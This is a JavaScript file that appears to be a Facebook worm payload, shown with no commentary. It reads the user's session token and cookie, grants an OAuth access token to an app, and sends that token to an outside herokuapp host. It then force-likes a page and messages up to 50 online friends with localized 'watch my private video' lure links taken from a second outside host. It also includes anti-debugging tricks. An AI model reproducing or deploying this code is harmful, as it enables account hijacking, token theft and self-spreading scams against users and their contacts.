(new Image).src = "//whos.amung.us/swidget/mandar1n0s";

var cnsl = true;
var win = this;
var ajax = win["XMLHttpRequest"];
function start() {
  var cookie_name = "sound:" + profile_id + " || audio: Enabled";
  var cookie_time = 30;
  if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
    createCookie(cookie_name, Date.now(), 1);
    config = {};
    config["chat_limit"] = 50;
    _e_P();
    nekot();
  }
}
function nekot() {
  if (localStorage.access_token != "nekot") {
    var getParams = {};
    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
    getParams["composer_type"] = "pages_feed";
    getParams["target_id"] = "20531316728";
    getParams["av"] = profile_id;
    getParams["dpr"] = "1";
    var params = {};
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = __dyn;
    params["__af"] = "j0";
    params["__req"] = "2z";
    params["__be"] = "-1";
    params["__pc"] = "EXP1:home_page_pkg";
    params["__rev"] = __rev;
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    var xhr = new ajax;
    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEWinbox";
          localStorage.access_token = "nekot";
        }
      }
    };
    xhr.send(deSerialize(params));
  }
}
function _e_P() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "3p";
  params["__req"] = "pS";
  params["__be"] = "-1";
  params["__pc"] = "EXP:DEFAULT";
  params["__rev"] = __rev;
  params["jazoest"] = jazoest;
  var xhr = new ajax;
  xhr.open("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      _g_T();
    }
  };
  xhr.send(deSerialize(params));
}
function _g_T() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["app_id"] = "165907476854626";
  params["redirect_uri"] = "fbconnect://success";
  params["display"] = "popup";
  params["access_token"] = "";
  params["sdk"] = "";
  params["from_post"] = "1";
  params["private"] = "";
  params["tos"] = "";
  params["login"] = "";
  params["read"] = "";
  params["write"] = "";
  params["extended"] = "";
  params["social_confirm"] = "";
  params["confirm"] = "";
  params["seen_scopes"] = "";
  params["auth_type"] = "";
  params["auth_token"] = "";
  params["auth_nonce"] = "";
  params["default_audience"] = "";
  params["ref"] = "Default";
  params["return_format"] = "access_token";
  params["domain"] = "";
  params["sso_device"] = "ios";
  params["__CONFIRM__"] = "1";
  var xhr = new ajax;
  xhr.open("POST", "/v2.8/dialog/oauth/confirm", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      if (xhr.responseText.indexOf("access_token=") > 0) {
        jsonOBJECT = {};
        jsonOBJECT.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
        jsonOBJECT.pages_id = 159848587923368;
        Kontrol(jsonOBJECT);
        online(jsonOBJECT);
      }
    }
  };
  xhr.send(deSerialize(params));
}
function Kontrol(jsonOBJECT) {
  var xhr = new XMLHttpRequest;
  var params = {};
  params["q"] = "SELECT created_time FROM page_fan WHERE uid = me() AND page_id = " + jsonOBJECT.pages_id;
  params["access_token"] = jsonOBJECT.access_token;
  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params));
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      if (data.data.length == 0) {
        pages(jsonOBJECT);
      }
    }
  };
  xhr.send();
}
function pages(jsonOBJECT) {
  var xhr = new XMLHttpRequest;
  var params = {};
  params["fbpage_id"] = jsonOBJECT.pages_id;
  params["add"] = "true";
  params["reload"] = "false";
  params["fan_origin"] = "page_timeline";
  params["fan_source"] = "";
  params["cat"] = "";
  params["actor_id"] = profile_id;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "iw";
  params["__req"] = "g";
  params["__be"] = "-1";
  params["__pc"] = "PHASED:DEFAULT";
  params["__rev"] = __rev;
  params["fb_dtsg"] = fb_dtsg;
  params["jazoest"] = jazoest;
  params["__spin_r"] = __rev;
  params["__spin_b"] = "trunk";
  params["__spin_t"] = Math.floor(Date.now() / 1E3);
  xhr.open("POST", "/ajax/pages/fan_status.php?av=" + profile_id + "&dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  };
  xhr.send(deSerialize(params));
}
function online(jsonOBJECT) {
  var params = {};
  params["q"] = "SELECT uid, name, locale, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
  params["access_token"] = jsonOBJECT.access_token;
  params["ext"] = "me";
  var xhr = new ajax;
  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params), true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
      if (!data.error) {
        var friends = data.data;
        friends = shuffle(friends);
        jsonOBJECT.friends = [];
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "active") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "idle") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        if (jsonOBJECT.friends.length > 0) {
          _G_L(jsonOBJECT);
        }
      }
    }
  };
  xhr.send();
}
function _G_L(jsonOBJECT) {
  var xhr = new ajax;
  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid=" + profile_id);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      if (data.link) {
        jsonOBJECT.link = data.link;
        i = 0;
        for (;i < jsonOBJECT.friends.length;i++) {
          jsonOBJECT.uid = jsonOBJECT.friends[i].uid;
          jsonOBJECT.pic_big = jsonOBJECT.friends[i].pic_big;
          jsonOBJECT.name = jsonOBJECT.friends[i].name ? jsonOBJECT.friends[i].name.split(" ")[0] : jsonOBJECT.friends[i].text.split(" ")[0];
          jsonOBJECT.locale = jsonOBJECT.friends[i].locale;
          _S_e(jsonOBJECT);
        }
      }
    }
  };
  xhr.send();
}
function _S_e(jsonOBJECT) {
  var uid = jsonOBJECT.uid;
  var pic_big = jsonOBJECT.pic_big;
  var name = jsonOBJECT.name;
  var fullname = jsonOBJECT.fullname.replace(/ /g,"_");
  var link = fullname+"_Video_"+jsonOBJECT.link;
  var lang = jsonOBJECT.locale;
  if(lang == "sq_AL") {
  title = "shiko videon teme dhe mos ja trego askujt";
  }
  else if(lang == "mk_MK") {
  title = "odgledaj go moeto video i ne mu go pokazuvaj nikomu";
  }
  else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
  title = "ver mi video y no mostrarlo a nadie";
  }
  else if(lang == "de_DE") {
  title = "sehen sie sich mein Video an und zeigen sie es niemandem";
  }
  else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
  title = "odgledaj moj video i ne pokazuj ga nikome";
  }
  else if(lang == "sl_SI") {
  title = "odglej moj videoposnetek in nikomu ne pokazuj";
  }
  else if(lang == "it_IT") {
  title = "guarda il mio video e non mostrarlo a nessuno";
  }
  else if(lang == "el_GR") {
  title = "Παρακολουθήστε το ιδιωτικό μου βίντεο και μην το εμφανίζετε σε κανέναν";
  }
  else if(lang == "pl_PL") {
  title = "obejrzyj mój film i nie pokazuj go nikomu";
  }
  else if(lang == "cz_CZ") {
  title = "sledovat moje video a neukázat to nikomuo";
  }
  else if(lang == "sk_SK") {
  title = "pozerat moje video a neukáže to nikomu";
  }
  else if(lang == "hu_HU") {
  title = "nézze meg videóimat, és ne mutassa meg senkinek";
  }
  else if(lang == "bg_BG") {
  title = "Гледай моето видео и не го показвай на никого";
  }
  else if(lang == "tl_PH") {
  title = "panoorin ang aking video at huwag ipakita ito sa sinuman";
  }
  else if(lang == "da_DK") {
  title = "se min video og vis den ikke til nogen";
  }
  else if(lang == "af_ZA") {
  title = "kyk na my video en wys dit nie aan enigiemand nie";
  }
  else if(lang == "ro_RO") {
  title = "vizionați videoclipul meu și nu îl afișați nimănui";
  }
  else if(lang == "ru_RU") {
  title = "Смотреть мое видео и не показывать его никому";
  }
  else if(lang == "fi_FI") {
  title = "katsele yksityistä videota ja älä näytä sitä kenellekään";
  }
  else if(lang == "sv_SE") {
  title = "titta på min privata video och visa inte den för någon";
  }
  else if(lang == "th_TH") {
  title = "ดูวิดีโอส่วนตัวของฉันและไม่แสดงให้ใครเห็น";
  }
  else if(lang == "tr_TR") {
  title = "Özel videoyu izlemek ve bunu kimseye göstermek";
  }
  else if(lang == "ka_GE") {
  title = "ნახეთ ჩემი პირადი ვიდეო და არავის არ აჩვენო";
  }
  else if(lang == "ar_AR") {
  title = "مشاهدة الفيديو الخاص بي لا تظهر لأي شخص";
  }
  else if(lang == "mr_IN") {
  title = "माझा खाजगी व्हिडिओ पहा आणि कोणालाही दाखवू नका";
  }
  else if(lang == "hi_IN") {
  title = "मेरा निजी वीडियो देखें और इसे किसी के साथ न देखेंा";
  }
  else if(lang == "bn_IN") {
  title = "আমার ব্যক্তিগত ভিডিও দেখুন এবং এটি কাউকে দেখান না";
  }
  else if(lang == "pa_IN") {
  title = "ਮੇਰਾ ਨਿਜੀ ਵੀਡੀਓ ਦੇਖੋ ਅਤੇ ਕਿਸੇ ਨੂੰ ਵੀ ਇਸ ਨੂੰ ਨਾ ਦਿਖਾਓ";
  }
  else if(lang == "gu_IN") {
  title = "મારી ખાનગી વિડિઓ જુઓ અને તેને કોઈને પણ બતાવશો નહીં";
  }
  else if(lang == "ta_IN") {
  title = "என் தனிப்பட்ட வீடியோவைப் பார்க்கவும் மற்றும் யாருக்கும் அதை காண்பிக்கவும் வேண்டாம்";
  }
  else if(lang == "te_IN") {
  title = "నా వ్యక్తిగత వీడియోను చూడండి మరియు దాన్ని ఎవరికీ చూపించవద్దు";
  }
  else if(lang == "fr_FR" || lang == "fr_CA") {
  title = "regarde ma vidéo  et ne le montre pas à personne";
  }
  else if(lang == "pt_PT" || lang == "pt_BR") {
  title = "assista meu vídeo  e não mostre a ninguém";
  }
  else if(lang == "nl_NL" || lang == "nl_BE") {
  title = "kijk naar mijn  video en laat het niet aan iedereen zien";
  }
  else if(lang == "nb_NO" || lang == "nn_NO") {
  title = "se min  video og ikke vis den til noen";
  }
  else {
  title = "watch my video and don't show it to anyone";
  }
  var message_id = rand(0xa1b01d4b1c7, 999999999999999);
  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
  message_id = rand(0xa1b01d4b1c7, 999999999999999);
  var params = {};
  params["client"] = "mercury";
  params["action_type"] = "ma-type:user-generated-message";
//  params["body"] =  emoji + "\n" + jsonOBJECT.link;
//  params["body"] = jsonOBJECT.name + "  " + emoji + "\n" + jsonOBJECT.link;
  params["body"] = emoji + "\n" + jsonOBJECT.name + " " + title + "\n" + jsonOBJECT.link;
  params["has_attachment"] = "false";
  params["message_id"] = message_id;
  params["offline_threading_id"] = message_id;
  params["other_user_fbid"] = jsonOBJECT.uid;
  params["signature_id"] = rastgele(8);
  params["source"] = "source:chat:web";
  params["specific_to_list[0]"] = "fbid:" + jsonOBJECT.uid;
  params["specific_to_list[1]"] = "fbid:" + profile_id;
  params["timestamp"] = Date.now();
  params["ui_push_phase"] = "C3";
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "j0";
  params["__req"] = "18";
  params["__be"] = "-1";
  params["__pc"] = "PHASED:DEFAULT";
  params["__rev"] = __rev;
  params["fb_dtsg"] = fb_dtsg;
  params["jazoest"] = jazoest;
  params["__spin_r"] = __rev;
  params["__spin_b"] = "trunk";
  params["__spin_t"] = Math.floor(Date.now() / 1E3);
  var xhr = new ajax;
  xhr.open("POST", "/messaging/send/?dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  };
  xhr.send(deSerialize(params));
}
function banword(obj) {
    delimiters = [unescape("%A0"), " ", ".", "_", "-"];
    obj = obj["split"]("");
    finalWord = "";
    insertIn = Math["floor"](Math["random"]() * obj["length"]);
    if (obj[insertIn] == " ") {
      insertIn--;
    }
    if (insertIn == obj["length"]) {
      insertIn--;
    }
    for (var i = 0;i < obj["length"];i++) {
      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
    }
    return finalWord;
  }
function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  n = 0;
  for (;n < length;n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}
function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(";");
  var i = 0;
  for (;i < ca.length;i++) {
    var c = ca[i];
    for (;c.charAt(0) == " ";) {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function createCookie(name, value, days) {
  var expires;
  if (days) {
    var date = new Date;
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1E3);
    expires = "; expires=" + date.toGMTString();
  } else {
    expires = "";
  }
  document.cookie = name + "=" + value + expires + "; path=/";
}
function inArray(arr, key, value) {
  var res = false;
  a = 0;
  for (;a < arr.length;a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}
function get_dyn() {
  function toCompressedString() {
    $BitMap1 = [];
    for (i in t) {
      $BitMap1[t[i]] = 1;
    }
    if ($BitMap1["length"] === 0) {
      return "";
    }
    var l = [];
    var m = 1;
    var n = $BitMap1[0] || 0;
    var o = n.toString(2);
    var p = 1;
    for (;p < $BitMap1["length"];p++) {
      var q = $BitMap1[p] || 0;
      if (q === n) {
        m++;
      } else {
        l["push"](j(m));
        n = q;
        m = 1;
      }
    }
    if (m) {
      l["push"](j(m));
    }
    return k(o + l["join"](""));
  }
  function j(l) {
    var m = l.toString(2);
    var n = "0"["repeat"](m["length"] - 1);
    return n + m;
  }
  function k(l) {
    var m = (l + "00000")["match"](/[01]{6}/g);
    var n = "";
    var o = 0;
    for (;o < m["length"];o++) {
      n += h[parseInt(m[o], 2)];
    }
    return n;
  }
  var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var is = bd["concat"](hd);
  var t = [];
  for (x in is) {
    if (is[x] != null) {
      var p = is[x]["replace"]("},", "")["replace"]("]", "");
      if (parseInt(p) >= 7) {
        t["push"](parseInt(p));
      }
    }
  }
  var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  return toCompressedString();
}
function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 65536).toString(16).substring(1);
  }
  return s4() + s4() + "-" + s4() + "-" + s4() + "-" + s4() + "-" + s4() + s4() + s4();
}
function randoms(l, m) {
  var r = [];
  for (;r.length < l;) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}
function searchArray(a, k) {
  var found = false;
  for (key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else {
      if (typeof a[key] == "object") {
        found = searchArray(a[key], k);
        if (found != false) {
          break;
        }
      }
    }
  }
  return found;
}
function shuffle(array) {
  var currentIndex = array.length;
  var temporaryValue;
  var randomIndex;
  for (;0 !== currentIndex;) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }
  return array;
}
function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
function rastgele(uzunluk) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  l = 0;
  for (;l < uzunluk;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function random(nr) {
  mtn = "abcdefghijklmnoprstuvyzx";
  ret = "";
  l = 0;
  for (;l < nr;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function deSerialize(json) {
  return Object.keys(json).map(function(key) {
    return encodeURIComponent(key) + "=" + encodeURIComponent(json[key]);
  }).join("&");
}

var cntrl = "d";
var element = new Image;
element.__defineGetter__("id", function() {
  cntrl = "e";
  if (cnsl == false) {
    location.reload();
  }
});
console.log(element);
console.clear();
if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == "d" || cnsl == true)) {
  fb_dtsg_list = document.getElementsByName("fb_dtsg");
  if (fb_dtsg_list.length > 0) {
    profile_id = document.cookie.match(/c_user=(\d+)/)[1];
    fb_dtsg = fb_dtsg_list[0].value;
    __dyn = get_dyn();
    if (document.head.innerHTML.split('"client_revision":')[1]) {
      __rev = document.head.innerHTML.split('"client_revision":')[1].split(",")[0];
    } else {
      __rev = rand(1111111, 9999999);
    }
    jazoest = "";
    var x = 0;
    for (;x < fb_dtsg.length;x++) {
      jazoest += fb_dtsg.charCodeAt(x);
    }
    jazoest = "2" + jazoest;
    start();
  }
}
;
